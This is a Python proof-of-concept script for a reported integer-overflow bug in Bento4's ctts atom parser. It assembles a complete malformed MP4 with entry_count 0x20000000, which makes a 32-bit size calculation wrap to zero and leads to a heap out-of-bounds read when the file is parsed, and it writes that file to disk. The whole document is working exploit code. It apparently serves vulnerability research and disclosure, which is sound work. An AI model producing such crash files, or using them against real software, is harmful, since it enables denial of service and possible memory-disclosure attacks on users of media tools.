#!/usr/bin/env python3
"""
PoC generator for VULN-001: ctts entry_count integer overflow (Bento4/Ap4CttsAtom.cpp:78-97)
entry_count=0x20000000 causes entry_count*8 to overflow to 0 in 32-bit arithmetic,
allocating a 0-byte buffer while the parser loop iterates 536M times -> heap OOB read.
"""
import struct
import sys
import os

def make_box(box_type, data):
    """Create a box with size(4BE) + type(4) + data"""
    size = 8 + len(data)
    return struct.pack('>I', size) + box_type + data

def make_fullbox(box_type, version, flags, data):
    """Create a FullBox: size(4) + type(4) + version(1) + flags(3) + data"""
    full_hdr = struct.pack('>B', version) + struct.pack('>I', flags)[1:]  # 1 byte version + 3 bytes flags
    return make_box(box_type, full_hdr + data)

# ftyp box
ftyp_data = b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom'
ftyp = make_box(b'ftyp', ftyp_data)

# ctts box with entry_count = 0x20000000
# Full atom header: version=0, flags=0, then entry_count
# Deliberately provide NO entry data after entry_count (size covers only header+entry_count)
entry_count = 0x20000000
ctts_payload = struct.pack('>I', entry_count)
ctts = make_fullbox(b'ctts', 0, 0, ctts_payload)

# stts (required, minimal: entry_count=0)
stts = make_fullbox(b'stts', 0, 0, struct.pack('>I', 0))

# stsd (required)
stsd_inner = struct.pack('>I', 0)  # entry_count=0
stsd = make_fullbox(b'stsd', 0, 0, stsd_inner)

# stsc
stsc = make_fullbox(b'stsc', 0, 0, struct.pack('>I', 0))

# stsz
stsz = make_fullbox(b'stsz', 0, 0, struct.pack('>II', 0, 0))

# stco
stco = make_fullbox(b'stco', 0, 0, struct.pack('>I', 0))

# stbl
stbl_data = stsd + stts + stsc + stsz + stco + ctts
stbl = make_box(b'stbl', stbl_data)

# smhd
smhd = make_fullbox(b'smhd', 0, 0, struct.pack('>HH', 0, 0))

# dref
dref_data = struct.pack('>I', 1) + make_fullbox(b'url ', 0, 1, b'')
dref = make_fullbox(b'dref', 0, 0, dref_data)

# dinf
dinf = make_box(b'dinf', dref)

# minf
minf_data = smhd + dinf + stbl
minf = make_box(b'minf', minf_data)

# mdhd
mdhd = make_fullbox(b'mdhd', 0, 0,
    struct.pack('>IIIII',
        0,          # creation_time
        0,          # modification_time
        44100,      # timescale
        1000,       # duration
        0,          # language + pre_defined
    ))

# hdlr
hdlr = make_fullbox(b'hdlr', 0, 0,
    struct.pack('>II', 0, 0) + b'soun' + struct.pack('>III', 0, 0, 0) + b'SoundHandler\x00')

# mdia
mdia_data = mdhd + hdlr + minf
mdia = make_box(b'mdia', mdia_data)

# tkhd (version 0):
# creation_time(I) modification_time(I) track_ID(I) reserved(I) duration(I)
# reserved[2](II) layer(H) alternate_group(H) volume(H) reserved(H)
# matrix(36 bytes) width(I) height(I)
tkhd = make_fullbox(b'tkhd', 0, 3,
    struct.pack('>IIIIIIIHHHH',
        0,          # creation_time
        0,          # modification_time
        1,          # track_ID
        0,          # reserved
        1000,       # duration
        0,          # reserved[0]
        0,          # reserved[1]
        0,          # layer
        0,          # alternate_group
        0,          # volume
        0,          # reserved
    ) + bytes(36) + struct.pack('>II', 0, 0))  # matrix + width/height

# trak
trak_data = tkhd + mdia
trak = make_box(b'trak', trak_data)

# mvhd
mvhd = make_fullbox(b'mvhd', 0, 0,
    struct.pack('>IIIII',
        0,      # creation_time
        0,      # modification_time
        1000,   # timescale
        1000,   # duration
        0x00010000,  # rate
    ) +
    struct.pack('>HH', 0x0100, 0) +  # volume, reserved
    struct.pack('>II', 0, 0) +        # reserved
    bytes(36) +                        # matrix (identity)
    struct.pack('>IIIIIIII', 0,0,0,0,0,0, 0x7fffffff, 2)  # pre-defined + next_track_id
)

# moov
moov_data = mvhd + trak
moov = make_box(b'moov', moov_data)

# mdat
mdat = make_box(b'mdat', b'\x00' * 8)

# Full file
mp4_data = ftyp + moov + mdat

out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001.mp4')
with open(out_path, 'wb') as f:
    f.write(mp4_data)
print(f'Written {len(mp4_data)} bytes to {out_path}')
